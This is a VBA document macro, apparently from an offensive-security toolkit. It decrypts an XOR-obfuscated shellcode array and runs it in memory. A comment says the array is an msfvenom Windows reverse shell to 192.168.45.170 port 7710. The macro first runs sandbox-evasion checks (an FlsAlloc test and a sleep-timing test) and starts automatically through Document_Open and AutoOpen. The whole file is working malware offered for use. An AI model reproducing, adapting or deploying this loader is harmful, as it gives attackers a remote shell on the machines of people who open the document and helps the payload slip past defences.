Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal securityAttributes As LongPtr, ByVal stackSize As LongPtr, ByVal startFunction As LongPtr, ByVal threadParameter As LongPtr, ByVal createFlags As LongPtr, ByRef threadId As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal address As LongPtr, ByVal size As Long, ByVal allocationType As Long, ByVal protection As Long) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal address As LongPtr, ByVal size As Long, ByVal newProtect As Long, ByRef oldProtect As Long) As Long
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destination As LongPtr, ByRef source As Any, ByVal length As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal callback As LongPtr) As Long
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal milliseconds As LongPtr)

Function MyMacro()
    Dim Warhead As Variant
    Dim address As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim oldProtect As Long
    Dim tmp As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    ' Exit if FlsAlloc fails
    If IsNull(FlsAlloc(tmp)) Then Exit Function
    
    ' Timing check
    t1 = Now()
    Sleep 2000
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 2 Then Exit Function
    
    ' msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=7710 -f csharp
    ' Output from Helpers/XOR_Shellcode_Encrypter_Helper_VBA_3Byte.cs
    Warhead = Array(75, 13, 51, 183, 229, 188, 215, 212, 110, 211, 110, 238, 135, 110, 238, 187, 108, 89, 60, 183, 168, 60, 151, 148, 134, 26, 179, 0, 175, 154, 134, 37, 16, 139, 132, _
192, 181, 201, 156, 118, 42, 177, 182, 34, 245, 194, 10, 238, 60, 183, 172, 60, 167, 128, 182, 53, 235, 60, 165, 196, 50, 37, 200, 251, 228, 108, 231, 110, 228, 151, _
228, 111, 60, 173, 164, 50, 44, 200, 139, 212, 67, 254, 110, 136, 60, 228, 106, 134, 37, 125, 120, 232, 16, 182, 34, 132, 87, 144, 72, 180, 152, 68, 140, 152, 152, _
194, 5, 228, 60, 189, 152, 182, 54, 218, 60, 233, 247, 60, 189, 160, 182, 54, 55, 179, 110, 189, 103, 108, 248, 147, 193, 231, 236, 132, 229, 237, 180, 67, 87, 189, _
227, 237, 110, 174, 94, 101, 67, 72, 26, 225, 223, 139, 217, 195, 229, 212, 192, 140, 210, 222, 177, 212, 251, 146, 154, 176, 26, 105, 134, 62, 239, 228, 182, 239, 228, _
13, 63, 183, 229, 188, 250, 138, 198, 222, 137, 208, 214, 202, 137, 153, 213, 156, 159, 140, 236, 214, 129, 135, 151, 166, 236, 226, 197, 243, 228, 197, 141, 128, 186, 136, _
232, 212, 156, 219, 140, 215, 210, 197, 241, 214, 134, 156, 248, 182, 156, 239, 204, 156, 246, 149, 204, 219, 128, 235, 210, 135, 247, 222, 145, 147, 129, 213, 137, 153, 212, _
146, 134, 208, 156, 159, 174, 244, 227, 168, 240, 155, 197, 208, 222, 142, 217, 151, 162, 217, 212, 142, 211, 158, 197, 234, 210, 151, 207, 222, 138, 210, 152, 212, 139, 153, _
214, 146, 134, 197, 241, 216, 135, 213, 219, 128, 147, 134, 208, 249, 134, 209, 132, 151, 182, 221, 209, 132, 206, 222, 202, 138, 135, 209, 146, 134, 229, 212, 141, 179, 197, _
16, 26, 105, 228, 182, 214, 180, 182, 239, 223, 251, 162, 183, 229, 84, 234, 228, 188, 183, 202, 214, 227, 156, 133, 252, 168, 145, 250, 130, 244, 248, 169, 246, 131, 138, _
209, 128, 167, 232, 214, 188, 219, 212, 141, 202, 249, 132, 215, 131, 141, 255, 254, 173, 214, 219, 130, 217, 237, 179, 204, 224, 149, 210, 212, 136, 253, 196, 136, 211, 193, _
191, 143, 241, 174, 223, 232, 221, 236, 133, 139, 234, 219, 215, 235, 209, 161, 139, 206, 130, 244, 131, 210, 217, 154, 211, 248, 135, 176, 142, 219, 168, 139, 221, 132, 133, _
154, 211, 196, 223, 178, 233, 227, 220, 254, 209, 181, 221, 254, 169, 207, 130, 214, 217, 248, 182, 254, 244, 128, 233, 222, 211, 223, 128, 164, 243, 244, 178, 200, 252, 136, _
132, 211, 186, 251, 223, 186, 253, 225, 200, 251, 219, 138, 234, 217, 200, 219, 206, 176, 141, 143, 212, 217, 193, 186, 239, 226, 162, 246, 211, 169, 215, 255, 144, 254, 230, _
148, 212, 130, 175, 240, 128, 212, 228, 239, 208, 249, 252, 156, 138, 249, 147, 241, 217, 169, 206, 240, 145, 207, 207, 208, 253, 211, 171, 136, 207, 189, 235, 206, 186, 206, _
251, 170, 249, 254, 148, 132, 240, 138, 201, 135, 151, 227, 207, 208, 188, 231, 141, 235, 62, 122, 122, 72, 48, 53, 113, 182, 212, 183, 215, 84, 51, 182, 239, 228, 178, _
239, 225, 141, 87, 226, 203, 135, 72, 48, 42, 221, 239, 227, 223, 101, 143, 183, 229, 53, 87, 143, 184, 231, 143, 163, 225, 141, 201, 241, 123, 58, 72, 48, 239, 228, _
182, 239, 225, 141, 145, 177, 253, 199, 72, 48, 57, 119, 144, 168, 223, 109, 175, 183, 229, 212, 243, 21, 137, 87, 26, 105, 248, 144, 113, 95, 174, 188, 183, 229, 214, _
247, 141, 188, 167, 229, 188, 223, 229, 188, 247, 229, 239, 223, 189, 24, 228, 0, 67, 98, 118, 239, 228, 108, 91, 224, 141, 188, 151, 229, 188, 228, 179, 212, 165, 115, _
53, 85, 26, 105, 50, 37, 200, 120, 110, 187, 182, 38, 57, 119, 144, 89, 239, 38, 227, 95, 142, 67, 72, 26, 141, 142, 215, 146, 134, 211, 132, 153, 209, 137, 153, _
212, 139, 135, 229, 7, 87, 248, 150, 189, 141, 26, 34, 88, 33, 72, 48, 128, 177, 153, 182, 55, 30, 92, 194, 224, 7, 240, 246, 206, 216, 143, 188, 228, 26, 105)

    ' XOR Decryption Key (3 bytes)
    ' Output from Helpers/XOR_Shellcode_Encrypter_Helper_VBA_3Byte.cs
    Dim key(2) As Byte
    key(0) = 183
    key(1) = 229
    key(2) = 188
    
    ' Decryption Process
    For i = 0 To UBound(Warhead)
        Warhead(i) = Warhead(i) Xor key(i Mod 3)
    Next i

    ' Allocate memory with read/write permissions
    address = VirtualAlloc(0, UBound(Warhead), &H3000, &H4)  ' MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    
    ' Copy shellcode into the allocated memory
    For counter = LBound(Warhead) To UBound(Warhead)
        data = Warhead(counter)
        res = RtlMoveMemory(address + counter, data, 1)
    Next counter
    
    ' Change memory protection to executable
    res = VirtualProtect(address, UBound(Warhead), &H20, oldProtect) ' PAGE_EXECUTE_READ
    
    ' Create a new thread to execute the shellcode
    res = CreateThread(0, 0, address, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
